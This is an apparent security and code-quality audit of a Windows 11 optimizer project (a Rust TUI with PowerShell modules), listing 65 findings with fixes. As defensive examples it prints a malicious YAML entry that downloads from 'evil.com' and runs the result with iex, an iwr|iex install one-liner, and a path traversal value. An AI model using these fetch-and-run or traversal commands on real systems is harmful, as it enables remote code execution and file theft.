# Win-11-Optimizer: Comprehensive Issue Tracker

> **Generated:** 2026-04-05  
> **Overall Status:** NOT PRODUCTION READY  
> **Total Issues:** 65 (11 Critical, 23 High, 21 Medium, 10 Low)

---

## Executive Summary

This document consolidates findings from comprehensive analysis of the Win-11-Optimizer codebase covering:
- Rust TUI application
- PowerShell modules and runtime
- CI/CD pipelines and security configuration
- Module manifests and reversibility

### Risk Overview

| Category | Critical | High | Medium | Low | Total |
|----------|----------|------|--------|-----|-------|
| Security | 6 | 8 | 7 | 0 | 21 |
| Code Quality | 2 | 6 | 5 | 8 | 21 |
| Compatibility | 1 | 4 | 2 | 0 | 7 |
| CI/CD | 2 | 4 | 5 | 2 | 13 |
| Reversibility | 0 | 1 | 2 | 0 | 3 |
| **Total** | **11** | **23** | **21** | **10** | **65** |

---

## Table of Contents

1. [Critical Issues (P0)](#critical-issues-p0)
2. [High Priority Issues (P1)](#high-priority-issues-p1)
3. [Medium Priority Issues (P2)](#medium-priority-issues-p2)
4. [Low Priority Issues (P3)](#low-priority-issues-p3)
5. [Remediation Plan](#remediation-plan)

---

## Critical Issues (P0)

### SEC-001: Command Injection via Invoke-Expression
**Severity:** CRITICAL | **Category:** Security/RCE  
**Files:** `runtime/godmode.ps1:484,514,539`

**Description:** Three instances of `Invoke-Expression` execute arbitrary commands from YAML metadata. If metadata.yaml files contain malicious content, arbitrary code runs with Administrator privileges.

**Vulnerable Code:**
```powershell
# Line 484 - Invoke-ModuleApply()
Invoke-Expression $cmd

# Line 514 - Invoke-ModuleRollback()
Invoke-Expression $cmd

# Line 539 - Invoke-ModuleVerify()
$result = Invoke-Expression $check
```

**Attack Vector:**
```yaml
# Malicious metadata.yaml
ApplyCommands:
  - "Invoke-WebRequest http://evil.com/payload.ps1 | iex"
```

**Fix:** Replace `Invoke-Expression` with call operator `&` and strict command validation.

---

### SEC-002: Firewall Rules Use DNS Hostnames (Silent Failure)
**Severity:** CRITICAL | **Category:** Security  
**Files:** `modules/ultimate/firewall-telemetry-blocking/apply.ps1:9-15,31-39`

**Description:** `New-NetFirewallRule` does NOT resolve DNS hostnames at runtime. Rules are created but match ZERO traffic.

**Vulnerable Code:**
```powershell
$endpoints = @(
    'vortex-win.data.microsoft.com',
    'telecommand.telemetry.microsoft.com'
)
New-NetFirewallRule -RemoteAddress $endpoint -Action Block  # SILENT FAIL
```

**Impact:** Users believe telemetry is blocked when zero traffic is actually blocked.

**Fix:** Resolve hostnames to IPs before creating firewall rules.

---

### SEC-003: PowerShell Execution Policy Bypass
**Severity:** CRITICAL | **Category:** Security  
**Files:** `src/executor/powershell.rs:30-31,60-61,137-138`

**Description:** All PowerShell commands use `-ExecutionPolicy Bypass` which completely disables script security.

**Code:**
```rust
.arg("-ExecutionPolicy")
.arg("Bypass")
```

**Impact:** Bypasses all PowerShell script signing requirements.

**Fix:** Use `-ExecutionPolicy RemoteSigned` or implement script verification.

---

### SEC-004: TruffleHog Uses Floating @main Tag
**Severity:** CRITICAL | **Category:** CI/CD Supply Chain  
**Files:** `.github/workflows/ci.yml:116`

**Code:**
```yaml
uses: trufflesecurity/trufflehog@main
```

**Impact:** Action maintainer can push malicious code that executes in CI.

**Fix:** Pin to specific SHA:
```yaml
uses: trufflesecurity/trufflehog@3ef00b03b17dbff85e1bb45c1d51fdc22e16c8ef
```

---

### SEC-005: Dangerous iex Installation Pattern
**Severity:** CRITICAL | **Category:** Security/Supply Chain  
**Files:** `scripts/install.ps1`, `README.md`

**Description:** One-liner install uses `iex` (Invoke-Expression) which executes arbitrary code without inspection.

**Documented Usage:**
```powershell
iwr -useb https://raw.githubusercontent.com/.../install.ps1 | iex
```

**Impact:** Man-in-the-middle or repository compromise = full system compromise.

**Fix:** Require explicit download, review, then execution.

---

### SEC-006: SECURITY.md Contains Placeholder Values
**Severity:** CRITICAL | **Category:** Security Policy  
**Files:** `SECURITY.md:15,82-83`

**Content:**
```
security@yourorg.com
GPG Key ID: YOUR_GPG_KEY_ID
```

**Impact:** Security researchers cannot report vulnerabilities.

**Fix:** Replace with actual contact information.

---

### CODE-001: PS5.1 Syntax Error Crashes Runtime
**Severity:** CRITICAL | **Category:** Compatibility  
**Files:** `runtime/godmode.ps1:725`

**Description:** Uses PS7.0+ inline-if syntax that crashes on PowerShell 5.1 (default on Windows 11).

**Broken Code:**
```powershell
Write-Host "..." -ForegroundColor (if ($x -eq 0) { 'Green' } else { 'Red' })
```

**Error:** `Unexpected token 'if' in expression or statement.`

**Fix:**
```powershell
$color = if ($x -eq 0) { 'Green' } else { 'Red' }
Write-Host "..." -ForegroundColor $color
```

---

### CODE-002: Export-ModuleMember in .ps1 Script Crashes
**Severity:** CRITICAL | **Category:** Code Quality  
**Files:** `runtime/utils.ps1:407-423`

**Description:** `Export-ModuleMember` only works in .psm1 modules, not .ps1 scripts. Causes crash when dot-sourced.

**Fix:** Remove `Export-ModuleMember` or restructure as proper PowerShell module.

---

### CODE-003: Snapshot Manager Panic on Failure
**Severity:** CRITICAL | **Category:** Code Quality  
**Files:** `src/executor/snapshot.rs:131`

**Code:**
```rust
impl Default for SnapshotManager {
    fn default() -> Self {
        Self::new().expect("Failed to create snapshot manager")
    }
}
```

**Impact:** Application panic with no recovery if directory creation fails.

**Fix:** Return `Result` or handle error gracefully.

---

### CICD-001: Missing scripts/package.ps1
**Severity:** CRITICAL | **Category:** CI/CD  
**Files:** Referenced but does not exist

**Impact:** Release automation fails completely.

**Fix:** Create the missing script or update references.

---

### ROLLBACK-001: Race Condition in Rollback Selection
**Severity:** CRITICAL | **Category:** Robustness  
**Files:** All `rollback.ps1` files

**Description:** Rollback scripts select "most recent" backup by timestamp, not by module state tracking.

**Scenario:**
1. Apply minimal layer (backup at T1)
2. Apply moderate layer (backup at T2)
3. Rollback minimal → gets T2 backup (WRONG!)

**Fix:** Track applied modules in state.json with explicit backup path mapping.

---

## High Priority Issues (P1)

### SEC-007: Path Traversal in Module Loading
**Severity:** HIGH | **Category:** Security  
**Files:** `src/app/context.rs:67-70`

**Code:**
```rust
self.modules_path.join(layer.as_str()).join(module_id)
```

**Risk:** If `module_id = "../../etc/passwd"`, arbitrary file reads possible.

**Fix:** Validate paths using `canonicalize()` and ensure within modules directory.

---

### SEC-008: Registry Bypass Without Validation
**Severity:** HIGH | **Category:** Security  
**Files:** `src/executor/powershell.rs:117-156`

**Description:** Directly manipulates registry to bypass system restore cooldown.

**Fix:** Document security implications, add user consent.

---

### SEC-009: Unsafe FFI in Admin Detection
**Severity:** HIGH | **Category:** Security  
**Files:** `src/executor/admin.rs:13-39`

**Description:** Multiple unsafe blocks for Windows API calls without comprehensive error handling.

**Fix:** Add proper error handling and consider using `windows-rs` safe wrappers.

---

### SEC-010: Self-Hosted Runner Secret Exposure
**Severity:** HIGH | **Category:** CI/CD Security  
**Files:** `.github/workflows/release.yml:43-48`

**Description:** Code signing password passed as environment variable, visible in process list.

**Fix:** Use Windows credential manager or secure vault.

---

### SEC-011: GPG Key Visible in Workflow Logs
**Severity:** HIGH | **Category:** CI/CD Security  
**Files:** `.github/workflows/release.yml:51-56`

**Fix:** Add `::add-mask::` to redact from logs.

---

### SEC-012: AllowTelemetry Ineffective on Home/Pro
**Severity:** HIGH | **Category:** Security  
**Files:** `modules/minimal/disable-telemetry/apply.ps1:56`

**Description:** `AllowTelemetry=0` only works on Enterprise/Education editions. Silently ignored on Home/Pro.

**Fix:** Detect Windows SKU and warn users or use alternative methods.

---

### SEC-013: No Validation of CLI-Provided Paths
**Severity:** HIGH | **Category:** Security  
**Files:** `src/app/context.rs:22-32`, `src/main.rs:94-95`

**Description:** Accepts arbitrary paths from CLI without sanitization.

**Fix:** Validate paths exist and are within expected directories.

---

### SEC-014: Unversioned Action Dependencies
**Severity:** HIGH | **Category:** CI/CD Security  
**Files:** `.github/workflows/release.yml:120`, `rust-release.yml:119`

**Actions using mutable tags:**
- `softprops/action-gh-release@v1`
- `dtolnay/rust-toolchain@stable`

**Fix:** Pin to commit SHA.

---

### CODE-004: PowerShell Fallback Missing
**Severity:** HIGH | **Category:** Compatibility  
**Files:** `src/executor/powershell.rs:27-38`

**Description:** Only tries `pwsh` (PowerShell Core), no fallback to `powershell.exe`.

**Impact:** Fails on systems without PowerShell Core installed.

**Fix:** Try `pwsh` first, fallback to `powershell.exe`.

---

### CODE-005: Hardcoded Windows Paths
**Severity:** HIGH | **Category:** Compatibility  
**Files:** 
- `src/executor/snapshot.rs:31`
- `src/executor/state.rs:41`
- `src/logging.rs:21`

**Code:**
```rust
PathBuf::from(r"C:\ProgramData\WinOptimizer\backup")
```

**Impact:** Fails on non-Windows, breaks cross-compilation.

**Fix:** Use `dirs` crate for cross-platform paths (already in dependencies).

---

### CODE-006: Incomplete Rollback Implementation in Rust
**Severity:** HIGH | **Category:** Code Quality  
**Files:** `src/app/commands.rs:140-143`

**Code:**
```rust
println!("\nRolling back changes...");
// Rollback logic here  <- COMMENT ONLY, NOT IMPLEMENTED
anyhow::bail!("Module {} failed to apply", module.id);
```

**Fix:** Implement actual rollback logic.

---

### CODE-007: Xbox Verify Logic Inverted
**Severity:** HIGH | **Category:** Code Quality  
**Files:** `modules/moderate/disable-xbox-services/verify.ps1:11-18`

**Description:** Verification checks for `Disabled` but apply sets to `Manual`.

**Impact:** Always reports failure when changes were correctly applied.

**Fix:** Check for `Manual` instead of `Disabled`.

---

### CODE-008: Plaintext Logging Instead of JSON
**Severity:** HIGH | **Category:** Code Quality  
**Files:** `runtime/godmode.ps1:142-168`

**Description:** Writes plaintext logs instead of JSON as specified.

**Fix:** Use `ConvertTo-Json` for log entries.

---

### ROLLBACK-002: WER Consent Not Restored
**Severity:** HIGH | **Category:** Reversibility  
**Files:** `modules/godmode/disable-wer/rollback.ps1:37-49`

**Description:** `DefaultConsent` registry value set in apply but never restored in rollback.

**Fix:** Add `DefaultConsent` to backup and restore operations.

---

### CICD-002: Code Signing Not Verified Before Release
**Severity:** HIGH | **Category:** CI/CD  
**Files:** `.github/workflows/release.yml:41-48`

**Description:** No verification that artifacts are actually signed before release.

**Fix:** Add signature verification step.

---

### CICD-003: Artifact Action Version Mismatch
**Severity:** HIGH | **Category:** CI/CD  
**Files:** `.github/workflows/release.yml:59,78`

**Description:** Uses `@v3` while other workflows use `@v4`.

**Fix:** Upgrade to `@v4` consistently.

---

### CICD-004: No Job-Level Permission Scoping
**Severity:** HIGH | **Category:** CI/CD Security  
**Files:** All workflow files

**Description:** Jobs inherit default write permissions.

**Fix:** Add explicit `permissions: contents: read` at workflow level.

---

## Medium Priority Issues (P2)

### SEC-015: Hidden Admin Check Skip Flag
**Files:** `src/main.rs:50-52`

**Code:** `#[arg(long, hide = true)] skip_admin_check: bool`

**Risk:** Circumvents privilege requirements.

---

### SEC-016: Unsafe JSON Deserialization
**Files:** `src/executor/state.rs:51-62`

**Risk:** Malicious state files could cause DoS.

---

### SEC-017: Directory Traversal in Snapshot Listing
**Files:** `src/executor/snapshot.rs:46-62`

**Risk:** Symlinks could be traversed.

---

### SEC-018: Missing Dependabot Configuration
**Files:** Missing `.github/dependabot.yml`

**Impact:** No automated dependency updates.

---

### SEC-019: Incomplete SECURITY.md Documentation
**Files:** `SECURITY.md`

**Missing:** CVSS guidelines, known vulnerabilities, third-party audits.

---

### SEC-020: Checksum Verification Incomplete
**Files:** `.github/workflows/release.yml:36-39`

**Issue:** Checksums written but not verified during download.

---

### SEC-021: No SLSA Provenance Attestation
**Files:** Release workflows

**Missing:** Build provenance and SBOM generation.

---

### CODE-009: Timestamp Not Parsed in Snapshots
**Files:** `src/executor/snapshot.rs:82`

**Code:** `created_at: Utc::now(), // TODO: Parse from name`

---

### CODE-010: Silent Failures with unwrap_or()
**Files:** `src/tui/screens.rs:312,326,375,488,556`

**Issue:** Wrong defaults rendered instead of error states.

---

### CODE-011: Exit Codes Masked
**Files:** `src/executor/powershell.rs:44,74`

**Code:** `output.status.code().unwrap_or(-1)`

---

### CODE-012: request_elevation() Incomplete
**Files:** `src/executor/admin.rs:68-80`

**Issue:** No return value checking on Windows API call.

---

### CODE-013: Duplicate Registry Set Operation
**Files:** `modules/godmode/disable-wer/apply.ps1:47-48`

**Issue:** Identical `Set-ItemProperty` executed twice.

---

### CODE-014: Widget Policy Not Backed Up
**Files:** `modules/minimal/disable-widgets/apply.ps1:27-33`

**Issue:** Policy value not saved before removal.

---

### COMPAT-001: Checkpoint-Computer Fails in CI
**Files:** `runtime/godmode.ps1:306`

**Issue:** System Restore not available on GitHub runners.

**Fix:** Detect `$env:CI` and skip.

---

### COMPAT-002: Path Resolution Failure Risk
**Files:** `src/main.rs:91`

**Issue:** `current_exe()?.parent().unwrap_or_else(...)` may fail.

---

### CICD-005: TruffleHog Missing Failure Handling
**Files:** `.github/workflows/ci.yml:115-121`

**Issue:** No `--fail` flag, no false positive suppression.

---

### CICD-006: Release Notes Template Injection Risk
**Files:** `.github/workflows/release.yml:91-117`

**Risk:** Version containing special characters could inject content.

---

### CICD-007: Overly Broad Permissions
**Files:** `.github/workflows/release.yml:71-72`

**Issue:** Full `contents: write` grants more than needed.

---

### CICD-008: Missing Branch Protection Documentation
**Files:** Repository settings (not in code)

---

### ROLLBACK-003: riskLevel Field Duplication
**Files:** All manifests and metadata.yaml

**Issue:** Field defined at both manifest and module level without precedence rules.

---

## Low Priority Issues (P3)

### CODE-015: Unused Import - Rect
**Files:** `src/tui/screens.rs:9`

---

### CODE-016: Dead Code - PROTECTED_REGISTRY_PATHS
**Files:** `src/core/protected.rs:63`

---

### CODE-017: Dead Code - is_protected_service()
**Files:** `src/core/protected.rs:72`

---

### CODE-018: Dead Code - is_protected_registry()
**Files:** `src/core/protected.rs:79`

---

### CODE-019: Dead Code - run_command()
**Files:** `src/executor/powershell.rs:56`

---

### CODE-020: Unused Theme Constants
**Files:** `src/tui/theme.rs:11-18`

**Constants:** `SECONDARY`, `ACCENT`, `INFO`, `subtitle`

---

### CODE-021: Unused Widget Functions
**Files:** `src/tui/widgets.rs`

**Functions:** `draw_title`, `draw_selection_list`, `BoxChars`

---

### CODE-022: Test Code Uses unwrap()
**Files:** `src/executor/state.rs:142,160,165`

---

### CICD-009: GPG Signing Only on Linux
**Files:** `.github/workflows/release.yml:51`

**Issue:** Condition `if: runner.os == 'Linux'` never executes on Windows runner.

---

### CICD-010: Missing WaaSMedicSvc in Protected List
**Files:** `runtime/utils.ps1:73-92`

---

## Remediation Plan

### Phase 1: Critical Security Fixes (Week 1)
| Issue | Effort | Owner |
|-------|--------|-------|
| SEC-001: Remove Invoke-Expression | 3h | - |
| SEC-002: Fix firewall DNS resolution | 4h | - |
| SEC-003: Change execution policy | 1h | - |
| SEC-004: Pin TruffleHog action | 0.5h | - |
| SEC-005: Remove iex pattern | 2h | - |
| SEC-006: Update SECURITY.md | 1h | - |
| CODE-001: Fix PS5.1 syntax | 2h | - |
| CODE-002: Remove Export-ModuleMember | 0.5h | - |
| CODE-003: Handle snapshot failures | 1h | - |
| ROLLBACK-001: Implement state tracking | 6h | - |

**Total P0 Effort:** ~21 hours

### Phase 2: High Priority Fixes (Week 2-3)
| Issue | Effort | Owner |
|-------|--------|-------|
| SEC-007 through SEC-014 | 12h | - |
| CODE-004 through CODE-008 | 8h | - |
| ROLLBACK-002 | 2h | - |
| CICD-002 through CICD-004 | 4h | - |

**Total P1 Effort:** ~26 hours

### Phase 3: Medium Priority (Week 4+)
- Address remaining SEC, CODE, COMPAT, CICD issues
- Add comprehensive test coverage
- Documentation updates

**Total P2 Effort:** ~40 hours

---

## Verification Checklist

Before production release:

- [ ] All P0 issues resolved
- [ ] All P1 issues resolved or documented as known limitations
- [ ] Security scan passes with no critical findings
- [ ] Code signing implemented and verified
- [ ] Rollback tested for all modules
- [ ] CI/CD pipelines green
- [ ] Documentation updated
- [ ] SECURITY.md has real contact information

---

## References

- [OWASP PowerShell Security Guidelines](https://cheatsheetseries.owasp.org/cheatsheets/Powershell_Security_Cheat_Sheet.html)
- [GitHub Actions Security Hardening](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions)
- [Rust Security Guidelines](https://anssi-fr.github.io/rust-guide/)
